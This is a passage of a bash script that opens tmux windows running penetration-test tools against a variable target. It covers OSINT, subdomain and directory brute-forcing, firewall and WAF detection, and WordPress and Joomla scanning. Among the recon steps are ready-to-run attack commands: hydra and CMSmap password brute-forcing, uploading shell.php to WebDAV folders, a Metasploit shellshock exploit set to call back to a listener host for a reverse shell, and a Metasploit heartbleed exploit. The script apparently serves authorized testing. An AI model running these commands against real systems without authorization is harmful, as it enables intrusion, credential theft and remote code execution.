# OSINT: WHOIS data exfiltration
# Layout
tmux new-window -t PT:6 -n 'OSINT: WHOIS data exfiltration'
tmux split-window -v -t PT:6.0
tmux split-window -v -t PT:6.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0 "# OSINT: WHOIS data exfiltration" Enter
tmux send-keys -t PT:6.0 "grep -v '^#' $folderProjectEngine/osint-web-whois.txt | xargs -I {} xdg-open {}"
tmux send-keys -t PT:6.1 "# OSINT: WHOIS qury with whois" Enter
tmux send-keys -t PT:6.1 "whois $domain && whois $ip"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: port scanning (online)
# Layout
tmux new-window -t PT:7 -n 'OSINT: port scanning (online)'
tmux split-window -v -t PT:7.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:7.0 "# OSINT: port scanning (online)" Enter
tmux send-keys -t PT:7.0 "grep -v '^#' $folderProjectEngine/osint-web-port.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: anonymous search engines
# Layout
tmux new-window -t PT:8 -n 'OSINT: anonymous search engines'
tmux split-window -v -t PT:8.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:8.0 "# OSINT: anonymous search engines" Enter
tmux send-keys -t PT:8.0 "grep -v '^#' $folderProjectEngine/osint-web-engine.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: search engines for companies or people
# Layout
tmux new-window -t PT:9 -n 'OSINT: search engines for companies or people'
tmux split-window -v -t PT:9.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:9.0 "# OSINT: search engines for companies or people" Enter
tmux send-keys -t PT:9.0 "grep -v '^#' $folderProjectEngine/osint-web-company.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: web reputation
# Layout
tmux new-window -t PT:10 -n 'OSINT: web reputation'
tmux split-window -v -t PT:10.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:10.0 "# OSINT: web reputation" Enter
tmux send-keys -t PT:10.0 "grep -v '^#' $folderProjectEngine/osint-web-reputation.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: wayback machine
# Layout
tmux new-window -t PT:11 -n 'OSINT: wayback machine'
tmux split-window -v -t PT:11.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:11.0 "# OSINT: wayback machine" Enter
tmux send-keys -t PT:11.0 "grep -v '^#' $folderProjectEngine/osint-web-wayback.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: shodan - censis
# Layout
tmux new-window -t PT:12 -n 'OSINT: shodan - censis'
tmux split-window -v -t PT:12.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:12.0 "# OSINT: shodan - censis" Enter
tmux send-keys -t PT:12.0 "grep -v '^#' $folderProjectEngine/osint-web-shodan.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: other sites
# Layout
tmux new-window -t PT:13 -n 'OSINT: other sites'
tmux split-window -v -t PT:13.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:13.0 "# OSINT: other sites" Enter
tmux send-keys -t PT:13.0 "grep -v '^#' $folderProjectEngine/osint-web-other.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# Active scan: subdomain
# Layout
tmux new-window -t PT:14 -n 'Active scan: subdomain'
tmux split-window -v -t PT:14.0
tmux select-pane -t "14.0"
tmux split-window -h -t "14.0"
tmux split-window -h -t "14.0"
tmux split-window -h -t "14.0"
tmux split-window -v -t PT:14.4
tmux select-pane -t "14.4"
tmux split-window -h -t "14.4"
tmux split-window -v -t PT:14.6
tmux select-pane -t "14.6"
tmux split-window -h -t "14.6"
tmux split-window -h -t "14.6"
tmux split-window -h -t "14.6"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:14.0 "# Active scan: subdomain with subfinder" Enter
tmux send-keys -t PT:14.0 "subfinder -d $domain -all"
tmux send-keys -t PT:14.1 "# Active scan: subdomain with sublist3r" Enter
tmux send-keys -t PT:14.1 "sublist3r -d $domain"
tmux send-keys -t PT:14.2 "# Active scan: subdomain with crtsh" Enter
tmux send-keys -t PT:14.2 "crtsh $domain"
tmux send-keys -t PT:14.3 "# find domain from crtsh sbdomain list" Enter
tmux send-keys -t PT:14.3 "cat crtsh-domain-list.txt | rev | cut -d "." -f 1,2 | rev | sort -u"
tmux send-keys -t PT:14.4 "# Active scan: create dictionary with cewl" Enter
tmux send-keys -t PT:14.4 "cewl $url -d 3 -m 5 -w cewl-subdomain.txt --with-numbers"
tmux send-keys -t PT:14.5 "# Active scan: find a valid dictionary with seclists" Enter
tmux send-keys -t PT:14.5 "find /usr/share/seclists/ -follow | grep subdomain | xargs wc -l | sort -nr # search dictionary"
tmux send-keys -t PT:14.6 "# Active scan: subdomain with gobuster" Enter
tmux send-keys -t PT:14.6 "gobuster vhost -u $domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain"
tmux send-keys -t PT:14.7 "# Active scan: subdomain with wfuzz" Enter
tmux send-keys -t PT:14.7 "wfuzz -H "Host: FUZZ."$domain -u http://$ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 178"
tmux send-keys -t PT:14.8 "# Active scan: subdomain with ffuf" Enter
tmux send-keys -t PT:14.8 "ffuf -H "Host: FUZZ."$domain -u http://$ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
tmux send-keys -t PT:14.9 "# find Subdomain (via cewl + gobuster)" Enter
tmux send-keys -t PT:14.9 "cewl $url -d 5 -m 3 -w cewl-sub.txt --with-numbers && $folderProjectEngine/manageLower.sh cewl-sub.txt $folderProjectWebInfo/output-sub.txt && wfuzz -H ""\"Host: FUZZ.$domain""\" -u http://$ip -w output-sub.txt --hh 178"
cd $folderProject


cd $folderProjectInfoGathering
# Active scan: OS Type
# Layout
tmux new-window -t PT:15 -n 'Active scan: OS Type'
tmux split-window -v -t PT:15.0
tmux split-window -v -t PT:15.1
tmux select-pane -t "15.1"
tmux split-window -h -t "15.1"
tmux split-window -v -t PT:15.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:15.0 "# Active scan: OS Type with ping" Enter
tmux send-keys -t PT:15.0 "ping $ip"
tmux send-keys -t PT:15.1 "# Active scan: OS Type with tcpdump and nc" Enter
tmux send-keys -t PT:15.1 "tcpdump -i eth0 -v -n ip src $ip"
tmux send-keys -t PT:15.2 "# Active scan: OS Type with tcpdump and nc" Enter
tmux send-keys -t PT:15.2 "nc $ip 80"
tmux send-keys -t PT:15.3 "# Active scan: OS Type with nmap" Enter
tmux send-keys -t PT:15.3 "nmap –Pn –O $ip"
cd $folderProject

cd $folderProjectInfoGathering
# Active scan: IP Neighbour/Virtual Host
# Layout
tmux new-window -t PT:16 -n 'Active scan: IP Neighbour'
tmux split-window -v -t PT:16.0
tmux select-pane -t "16.0"
tmux split-window -h -t "16.0"
tmux split-window -h -t "16.0"
tmux split-window -v -t PT:16.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:16.0 "# Active scan: find a valid dictionary with seclists" Enter
tmux send-keys -t PT:16.0 "find /usr/share/seclists/ -follow | grep subdomain | xargs wc -l | sort -nr # search dictionary"
tmux send-keys -t PT:16.1 "# Active scan: IP Neighbour dictionary with cewl+fromWord2SIte" Enter
tmux send-keys -t PT:16.1 "cewl $url -d 3 -m 5 -w cewl-vhost.txt --with-numbers"
tmux send-keys -t PT:16.2 "# Active scan: IP Neighbour dictionary with cewl+fromWord2SIte" Enter
tmux send-keys -t PT:16.2 "sudo python3 /opt/fromWord2Site/fromWord2Site.py cewl-vhost.txt www,api com,ctf,online"
tmux send-keys -t PT:16.3 "# Active scan: IP Neighbour with gobuster" Enter
tmux send-keys -t PT:16.3 "gobuster vhost -u $url -w cewl-vhost.txt.ouput"
cd $folderProject


cd $folderProjectInfoGathering
# firewall detection
# Layout
tmux new-window -t PT:17 -n 'Active scan: Firewall detection'
tmux split-window -v -t PT:17.0
tmux split-window -v -t PT:17.1
tmux split-window -v -t PT:17.2
tmux split-window -v -t PT:17.3
tmux split-window -v -t PT:17.4
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:17.0 "# Active scan: nmap (SYN + ACK). UNFILTERED -> FW stateless; FILTERED -> FW steteful" Enter
tmux send-keys -t PT:17.0 "sudo nmap -sS $ip -Pn && sudo nmap -sA $ip -Pn"
tmux send-keys -t PT:17.1 "# nmap (firewalk)" Enter
tmux send-keys -t PT:17.1 "sudo nmap --script=firewalk --traceroute $ip"
tmux send-keys -t PT:17.2 "# nmap (waf-detection)" Enter
tmux send-keys -t PT:17.2 "nmap --script=http-waf-detect $ip -Pn -p 80"
tmux send-keys -t PT:17.3 "# WAF detection with identYwaf" Enter
tmux send-keys -t PT:17.3 "sudo python3 /opt/identYwaf/identYwaf.py $site"
cd $folderProject


# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;
            
            






            
            
            
        3)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Information Gathering (WEB): WAF detection, site structure, virtual host, etc
######################
######################

# INFORMATION GATHERING (WEB)
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectWebInfo" Enter

cd $folderProjectWebInfo
# Information Gathering (WEB): info from site - email,name,telephone
# Layout
tmux new-window -t PT:1 -n 'Information Gathering (WEB): info from site - email,name,telephone (webDataExtractor)'
tmux split-window -v -t PT:1.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# Information Gathering (WEB): info from site - email,name,telephone (webDataExtractor)" Enter
tmux send-keys -t PT:1.0 "sudo python /opt/webDataExtractor/webDataExtractor.py $url 1"
tmux send-keys -t PT:1.1 "# Information Gathering (WEB): extend name list with username-anarchy" Enter
tmux send-keys -t PT:1.1 "sudo /opt/username-anarchy/username-anarchy <usernname>"
cd $folderProject

# Information Gathering (WEB): info from site - link contenuti nel sistema target
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:2 -n 'Information Gathering (WEB): info from site - link contenuti nel sistema target'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# Information Gathering (WEB): info from site - link contenuti nel sistema target (sxcurity/gau)" Enter
tmux send-keys -t PT:2.0 "sudo docker run --rm -i sxcurity/gau $domain --subs"
tmux send-keys -t PT:2.1 "# Information Gathering (WEB): info from site - link contenuti nel sistema target (hakluke/hakrawler)" Enter
tmux send-keys -t PT:2.1 "echo $url | sudo docker run --rm -i hakluke/hakrawler -subs"
cd $folderProject

cd $folderProjectWebInfo
# Information Gathering (WEB): info from site - whois,subdomain,email (dmitry)
# Layout
tmux new-window -t PT:3 -n 'Information Gathering (WEB): info from site - whois,subdomain,email (dmitry)'
tmux split-window -v -t PT:3.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# Information Gathering (WEB): info from site - whois,subdomain,email (dmitry)" Enter
tmux send-keys -t PT:3.0 "dmitry -news $domain -o $folderProjectInfoGathering/dmitry.txt"
cd $folderProject

cd $folderProjectWebInfo
# Information Gathering (WEB): info from site - link interni, esterni, username, IP (spiderfoot)
# Layout
tmux new-window -t PT:4 -n 'Information Gathering (WEB): info from site - link interni, esterni, username, IP (spiderfoot)'
tmux split-window -v -t PT:4.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# Information Gathering (WEB): info from site - link interni, esterni, username, IP (spiderfoot)" Enter
tmux send-keys -t PT:4.0 "firefox 127.0.0.1:8083 & spiderfoot -l 127.0.0.1:8083"
cd $folderProject

# Information Gathering (WEB): info from site - data creazione sito
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:5 -n 'Information Gathering (WEB): info from site - website creation date'
tmux split-window -v -t PT:5.0
tmux split-window -v -t PT:5.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# get favicon and its creation date" Enter
tmux send-keys -t PT:5.0 "wget $url/images/favicon.ico; exiftool favicon.ico"
cd $folderProject

# Information Gathering (WEB): info from site - download file
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:6 -n 'Information Gathering (WEB): info from site - download file'
tmux split-window -v -t PT:6.0
tmux split-window -v -t PT:6.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0 "# download interesting file (e.g. pdf)" Enter
tmux send-keys -t PT:6.0 "metagoofil -d $domain -t pdf -l 100 -n 25 -f metagoofil-result.txt"
tmux send-keys -t PT:6.1 "# get meta information from file" Enter
tmux send-keys -t PT:6.1 "exiftool <link to file>"
cd $folderProject

# Information Gathering (WEB): info from site - website creation framework
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:7 -n 'Information Gathering (WEB): info from site - website creation framework'
tmux split-window -v -t PT:7.0  
tmux split-window -v -t PT:7.1 
tmux select-pane -t "7.1"
tmux split-window -h -t "7.1"
tmux split-window -h -t "7.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:7.0 "# website creation framework" Enter
tmux send-keys -t PT:7.0 "curl -s -I $url"
tmux send-keys -t PT:7.1 "# GET normal request" Enter
tmux send-keys -t PT:7.1 "echo -e \"GET / HTTP/1.0\n\" | nc -nv $ip 80"
tmux send-keys -t PT:7.2 "# GET error request" Enter
tmux send-keys -t PT:7.2 "echo -e \"GET / HTTP/3.0\n\" | nc -nv $ip 80"
tmux send-keys -t PT:7.3 "# GET error request" Enter
tmux send-keys -t PT:7.3 "echo -e \"GET / JUNK/1.0\n\" | nc -nv $ip 80"
cd $folderProject

# Information Gathering (WEB): info from site - miscellaneous information
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:8 -n 'Information Gathering (WEB): info from site - miscellaneous information'
tmux split-window -v -t PT:8.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:8.0 "# miscellaneous information" Enter
tmux send-keys -t PT:8.0 "theHarvester -d $domain -b all -l 500 -f $folderProject"
cd $folderProject

# Information Gathering (WEB): info from site - security header
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:9 -n 'Information Gathering (WEB): info from site - security header'
tmux split-window -v -t PT:9.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:9.0 "# Security Header" Enter
tmux send-keys -t PT:9.0 "xdg-open \"https://securityheaders.com/\" & xdg-open \"https://www.ssllabs.com/ssltest/\""
cd $folderProject

cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:10 -n 'Information Gathering (WEB): Site Structure'
tmux split-window -v -t PT:10.0  
tmux split-window -v -t PT:10.1 
tmux split-window -v -t PT:10.2  
tmux select-pane -t "10.2"
tmux split-window -h -t "10.2"
tmux split-window -h -t "10.2"
tmux split-window -v -t PT:10.5
tmux select-pane -t "10.5"
tmux split-window -h -t "10.5"
# Esecuzione dei comandi nelle sottofinestre
# WGET standard file
tmux send-keys -t PT:10.0 "# get common file (robots, sitemap, ...)" Enter
tmux send-keys -t PT:10.0 "wget ""http://$site/robots.txt"" ""http://$site/sitemap.xml"" ""http://$site/crossdomain.xml"" ""http://$site/phpinfo.php"" ""http://$site/index.php"" ""http://$site/index.html"" ""http://$site/README.md"" ""https://$site/robots.txt"" ""https://$site/sitemap.xml"" ""https://$site/crossdomain.xml"" ""https://$site/phpinfo.php"" ""https://$site/index.php"" ""https://$site/index.html"" ""https://$site/README.md"""
tmux send-keys -t PT:10.1 "# find dictionary." Enter
tmux send-keys -t PT:10.1 "find /usr/share/seclists/ | grep dir | xargs wc -l  | sort -n" 
tmux send-keys -t PT:10.2 "# find folders" Enter
tmux send-keys -t PT:10.2 "dirsearch -u $url /usr/share/wordlists/dirb/big.txt"
tmux send-keys -t PT:10.3 "# find folders" Enter
tmux send-keys -t PT:10.3 "dirsearch -u $url"
tmux send-keys -t PT:10.4 "# find folders" Enter
tmux send-keys -t PT:10.4 "gobuster dir -u $url -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k"
tmux send-keys -t PT:10.5 "# if target site respond always 20x" Enter
tmux send-keys -t PT:10.5 "ffuf -u $url/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 2066"
tmux send-keys -t PT:10.6 "# if target site respond always 30x" Enter
tmux send-keys -t PT:10.6 "gobuster dir -u $url -x php,html -w /usr/share/wordlists/dirb/common.txt -b \"204,301,302,307,401,403\" # if target answer always 30x"
cd $folderProject

# from Site Structure -> WEB DAV
cd $folderProjectQucikWin
# Layout
tmux new-window -t PT:11 -n 'from Site Structure -> WEB DAV'
tmux split-window -v -t PT:11.0
tmux split-window -v -t PT:11.1
tmux split-window -v -t PT:11.2
tmux split-window -v -t PT:11.3
tmux select-pane -t "11.3"
tmux split-window -h -t "11.3"
tmux split-window -h -t "11.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:11.0 "# Bruteforce attack to get Target Site Folders" Enter
tmux send-keys -t PT:11.0 "gobuster dir -u $url -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
tmux send-keys -t PT:11.1 "# Bruteforce attack to get credentials to specific folder" Enter
tmux send-keys -t PT:11.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
tmux send-keys -t PT:11.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
tmux send-keys -t PT:11.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt $url wampp xampp"
tmux send-keys -t PT:11.3 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:11.3 "cadaver $ip"
tmux send-keys -t PT:11.4 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:11.4 "curl -T shell.txt -u login:password http://$ip"
tmux send-keys -t PT:11.5 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:11.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
cd $folderProject

# from site structure -> shellShock
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:12 -n 'from site structure -> shellShock'
tmux split-window -v -t PT:12.0
tmux select-pane -t "12.0"
tmux split-window -h -t "12.0"
tmux split-window -v -t PT:12.2
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:12.0 "# Search for cgi file with dirsearch" Enter
tmux send-keys -t PT:12.0 "dirsearch -u $url -w /usr/share/wordlists/dirb/big.txt"
tmux send-keys -t PT:12.1 "# Search shellshock vulnerability with nikto" Enter
tmux send-keys -t PT:12.1 "nikto -h $ip"
tmux send-keys -t PT:12.2 "# Exploit shellshock with msfconsole" Enter
tmux send-keys -t PT:12.2 "msfconsole -qx \"use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOST $ip; set TARGETURI /cgi-bin/test; set RPORT 80; set LHOST 192.168.1.11; run\""
cd $folderProject

# from site structure -> nginx off by side
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:13 -n 'from site structure -> nginx off by side'
tmux split-window -v -t PT:13.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:13.0 "# if find redirect from /asset to /asset/" Enter
tmux send-keys -t PT:13.0 "dirsearch -u $url -w /usr/share/wordlists/dirb/big.txt"
cd $folderProject

# WEB File extension
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:14 -n 'Information Gathering (WEB): WEB File Extension'
tmux split-window -v -t PT:14.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:14.0 "# find files with multiple extension" Enter
tmux send-keys -t PT:14.0 "wfuzz -c -w /usr/share/wordlists/dirb/common.txt -w /usr/share/wordlists/dirb/extensions_common.txt --sc 200 $url/FUZZFUZ2Z"
cd $folderProject

# WEB Metodi Attivi
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:15 -n 'Information Gathering (WEB): Active web methods'
tmux split-window -v -t PT:15.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:15.0 "# HTTP method allowed" Enter
tmux send-keys -t PT:15.0 "URL=\"$url\"; for method in \"OPTIONS\" \"GET\" \"POST\" \"PUT\" \"DELETE\"; do echo \"Testing \$method method:\"; curl -X \$method -I \$URL; echo \"-------------------------\"; done"
cd $folderProject

# WEB API
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:16 -n 'Information Gathering (WEB): API analysis'
tmux split-window -v -t PT:16.0
tmux select-pane -t "16.0"
tmux split-window -h -t "16.0"
tmux split-window -v -t PT:16.2
tmux select-pane -t "16.2"
tmux split-window -h -t "16.2"
tmux split-window -v -t PT:16.4
tmux select-pane -t "16.4"
tmux split-window -h -t "16.4"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:16.0 "# find endPoint with kr - dictionary" Enter
tmux send-keys -t PT:16.0 "/opt/kitrunner/kr wordlist list"
tmux send-keys -t PT:16.1 "# find endPoint with kr - execute command" Enter
tmux send-keys -t PT:16.1 "/opt/kitrunner/kr scan $url -A httparchive_apiroutes_2023_10_28.txt # find endpoint auto"
tmux send-keys -t PT:16.2 "# find endPoint with wfuzz" Enter
tmux send-keys -t PT:16.2 "wfuzz -X POST -w /usr/share/seclists/Discovery/Web-Content/common.txt -u $url/api/v1/FUZZ --hc 403,404"
tmux send-keys -t PT:16.3 "# find endPoint with ffuf" Enter
tmux send-keys -t PT:16.3 "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u $url/api/v1/FUZZ "
tmux send-keys -t PT:16.4 "# find Data Parameter with curl " Enter
tmux send-keys -t PT:16.4 "curl -X POST -H 'Content-type: application/json' -x $url/api/v1/user -d '{""user"":""admin"",""pass"",""password""}'"
tmux send-keys -t PT:16.5 "# find Data Parameter with ffuf " Enter
tmux send-keys -t PT:16.5 "ffuf -request request.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt"

# Guessing GET / POST Parameter
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:17 -n 'Information Gathering (WEB): Guessing GET/POST param'
tmux split-window -v -t PT:17.0
tmux split-window -v -t PT:17.1
tmux split-window -v -t PT:17.2
tmux split-window -v -t PT:17.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:17.0 "# find a valid parameter (GET)" Enter
tmux send-keys -t PT:17.0 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt $url/action.php?FUZZ=test"
tmux send-keys -t PT:17.1 "# find a valid value (GET)" Enter
tmux send-keys -t PT:17.1 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt $url/action.php?Param1=FUZZ"
tmux send-keys -t PT:17.2 "# find a valid parameter (POST)" Enter
tmux send-keys -t PT:17.2 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d \"name=dok&FUZZ=1\" $url/action.php"
tmux send-keys -t PT:17.3 "# find a valid value (POST)" Enter
tmux send-keys -t PT:17.3 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d \"name=dok&Param1=FUZZ\" $url/action.php"

# WEB Analisi del certificato HTTPS
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:18 -n 'Information Gathering (WEB): WEB Certificate analysis and verify heartbleed'
tmux split-window -v -t PT:18.0
tmux split-window -v -t PT:18.1
tmux split-window -v -t PT:18.2
tmux select-pane -t "18.2"
tmux split-window -h -t "18.2"
tmux split-window -h -t "18.2"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:18.0 "# SSL certificate analysis with sslscan" Enter
tmux send-keys -t PT:18.0 "sslscan https://$site"
tmux send-keys -t PT:18.1 "# SSL certificate download" Enter
tmux send-keys -t PT:18.1 "openssl s_client -connect $site:443 </dev/null 2>/dev/null | openssl x509 -out $site.crt; echo \"Certificato scaricato: $site.crt\" # get certificate info"
tmux send-keys -t PT:18.2 "# heartbleed analysis with sslyze" Enter
tmux send-keys -t PT:18.2 "sslyze -heartbleed $ip"
tmux send-keys -t PT:18.3 "# heartbleed analysis with nmap" Enter
tmux send-keys -t PT:18.3 "nmap -p 443 -sV --script=ssl-heartbleed $ip"
tmux send-keys -t PT:18.4 "# heartbleed analysis with sslscan" Enter
tmux send-keys -t PT:18.4 "sslscan https://$site"
cd $folderProject

# Exploit heartbleed
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:19 -n 'Information Gathering (WEB): Exploit heartbleed'
tmux split-window -v -t PT:19.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:19.0 "# Exploit heartbleed" Enter
tmux send-keys -t PT:19.0 "msfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS $ip;set RPORT 443;set VERBOSE true;exploit;\""
cd $folderProject

# CMS: multi-platform analysis and bruteforce
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:20 -n 'CMS: multi-platform analysis and bruteforce'
tmux split-window -v -t PT:20.0
tmux select-pane -t "20.0"
tmux split-window -h -t "20.0"
tmux split-window -h -t "20.0"
tmux split-window -v -t PT:20.3
tmux select-pane -t "20.3"
tmux split-window -h -t "20.3"
tmux split-window -h -t "20.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:20.0 "# CMS: multi-platform analysis with whatweb" Enter
tmux send-keys -t PT:20.0 "whatweb -a 3 $url"
tmux send-keys -t PT:20.1 "# CMS: multi-platform analysis update cmsmap" Enter
tmux send-keys -t PT:20.1 "sudo python /opt/CMSmap/cmsmap.py --update $url"
tmux send-keys -t PT:20.1 "# CMS: multi-platform analysis with cmsmap " Enter
tmux send-keys -t PT:20.1 "sudo python /opt/CMSmap/cmsmap.py -F $url"
tmux send-keys -t PT:20.2 "# CMS: multi-platform bruteforce (Wordpress)" Enter
tmux send-keys -t PT:20.2 "sudo python /opt/CMSmap/cmsmap.py $url –u users.txt –p passwords.txt –f W"
tmux send-keys -t PT:20.3 "# CMS: multi-platform bruteforce (Joomla)" Enter
tmux send-keys -t PT:20.3 "sudo python /opt/CMSmap/cmsmap.py $url –u users.txt –p passwords.txt –f J"
tmux send-keys -t PT:20.4 "# CMS: multi-platform bruteforce (Drupal)" Enter
tmux send-keys -t PT:20.4 "sudo python /opt/CMSmap/cmsmap.py $url –u users.txt –p passwords.txt –f D"
cd $folderProject

# CMS: WORDPRESS
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:21 -n 'CMS: Wordpress'
tmux split-window -v -t PT:21.0
tmux select-pane -t "21.0"
tmux split-window -h -t "21.0"
tmux split-window -h -t "21.0"
tmux split-window -h -t "21.0"
tmux split-window -h -t "21.0"
tmux split-window -h -t "21.0"
tmux split-window -v -t PT:21.6
tmux select-pane -t "21.6"
tmux split-window -h -t "21.6"
tmux split-window -v -t PT:21.8
tmux select-pane -t "21.8"
tmux split-window -h -t "21.8"
tmux split-window -v -t PT:21.10
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:21.0 "# CMS: Wordpress analysis with nmap" Enter
tmux send-keys -t PT:21.0 "sudo nmap -Pn -vv -p 80 --script=http-wordpress* $ip -oA out.wp"
tmux send-keys -t PT:21.1 "# CMS: Wordpress analysis with cmseek" Enter
tmux send-keys -t PT:21.1 "cmseek -u $url"
tmux send-keys -t PT:21.2 "# CMS: Wordpress analysis with cmsmap" Enter
tmux send-keys -t PT:21.2 "sudo python /opt/CMSmap/cmsmap.py $url –f W"
tmux send-keys -t PT:21.3 "# CMS: Wordpress analysis with wpsec" Enter
tmux send-keys -t PT:21.3 "firefox https://wpsec.com &"
tmux send-keys -t PT:21.4 "# CMS: Wordpress analysis with msfconsole" Enter
tmux send-keys -t PT:21.4 "msfconsole -q -x \"use auxiliary/scanner/http/wordpress_scanner;set RHOSTS $ip;set THREADS 5;run\""
tmux send-keys -t PT:21.5 "# CMS: Wordpress analysis with wpscan" Enter
tmux send-keys -t PT:21.5 "wpscan --url $url --enumerate p,t,cb,dbe,u --plugins-detection aggressive --api-token <TOKEN> [--disable-tls-checks] && wpscan --url $url --enumerate ap,at,cb,dbe,u --plugins-detection aggressive --api-token <TOKEN> [--disable-tls-checks]"
tmux send-keys -t PT:21.6 "# CMS: Wordpress manual users enum" Enter
tmux send-keys -t PT:21.6 "firefox $url/?author=1 &"
tmux send-keys -t PT:21.7 "# CMS: Wordpress manual users enum" Enter
tmux send-keys -t PT:21.7 "firefox $url/wp-json/wp/v2/users/1 &"
tmux send-keys -t PT:21.8 "# CMS: Wordpress Version" Enter
tmux send-keys -t PT:21.8 "firefox $url/readme.txt &"
tmux send-keys -t PT:21.9 "# CMS: Wordpress Plugins enumeration" Enter
tmux send-keys -t PT:21.9 "firefox -no-remote $url/wp-content/plugins/ & firefox -no-remote $url/wp-content/themes/ & firefox -no-remote $url/wp-content/ & firefox -no-remote $url/upload/ & firefox -no-remote $url/images/ &"
tmux send-keys -t PT:21.10 "# CMS: Wordpress Exploit vulnerability" Enter
tmux send-keys -t PT:21.10 "searchsploit -u && searchsploit >module>"
cd $folderProject

# CMS JOOMLA
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:22 -n 'CMS Joomla'
tmux split-window -v -t PT:22.0
tmux select-pane -t "22.0"
tmux split-window -h -t "22.0"
tmux split-window -h -t "22.0"
tmux split-window -h -t "22.0"
tmux split-window -v -t PT:22.4
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:22.0 "# CMS: Joomla analysis with cmsmap" Enter
